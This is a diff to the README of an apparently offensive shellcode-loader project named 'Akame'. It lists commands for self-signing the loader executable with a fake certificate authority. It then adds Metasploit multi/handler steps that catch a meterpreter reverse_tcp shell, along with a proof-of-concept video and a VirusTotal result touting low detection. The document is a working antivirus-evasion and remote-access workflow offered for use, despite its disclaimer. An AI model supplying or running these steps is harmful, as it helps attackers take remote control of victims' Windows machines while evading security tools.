@@ -54,8 +54,20 @@ Icon: https://icon-icons.com/icon/Halloween-eye/109170
 - certutil -user -addstore Root AkameCA.cer<br>
 - makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer<br>
 - pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx<br>
-- signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe<br>
+- signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe
+  
+**7. Listen for incomming connections<br>**
+- msfconsole -q
+- use exploit/multi/handler
+- set payload windows/x64/meterpreter/reverse_tcp
+- (optional) show options
+- set LHOST <IP>
+- set LPORT <PORT>
+- exploit
 
+## Video, poc with meterpreter shellcode
+<div style="width:100%;height:0px;position:relative;padding-bottom:56.250%;"><iframe src="https://streamable.com/e/mwknij" frameborder="0" width="100%" height="100%" allowfullscreen style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden;"></iframe></div>
+  
 ## VirusTotal Scan (3/71 security vendors and no sandboxes on 24/10/2022)
 I uploaded the loader to Virus Total because I don't want this to be used for malicious purposes!<br>
 The shellcode used was generated with metasploit (payload: windows/x64/meterpreter/reverse_tcp) and encrypted by \resources\encrypt.exe.<br>
